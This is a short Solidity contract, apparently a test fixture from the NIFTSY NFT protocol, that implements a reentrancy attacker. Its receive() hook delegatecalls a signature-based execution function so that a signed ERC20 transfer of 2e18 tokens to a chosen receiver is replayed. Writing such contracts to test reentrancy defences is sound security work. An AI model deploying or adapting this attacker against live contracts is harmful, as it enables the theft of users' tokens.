// SPDX-License-Identifier: MIT
// NIFTSY protocol for NFT
pragma solidity ^0.8.20;

contract ReentrancyAttacker2 {

    address public wnfAddress;
    address public receiver;
    address public erc20;
    bytes public signature;
    
    constructor(address _wnft,
        address _receiver,
        address _erc20
        ) {
        wnfAddress = _wnft;
        receiver = _receiver;
        erc20 = _erc20;
    }

    receive() external payable virtual {
            bytes memory _data = abi.encodeWithSignature(
            "transfer(address,uint256)",
            receiver, 2e18
        );

        (bool success, bytes memory data) = wnfAddress.delegatecall(
            abi.encodeWithSignature("executeEncodedTxBySignature(address,uint256,bytes,bytes)",
                erc20,0,_data,signature)
        );
    }

    function setSignature(bytes memory _signature) external {
        signature = _signature;
    }
}


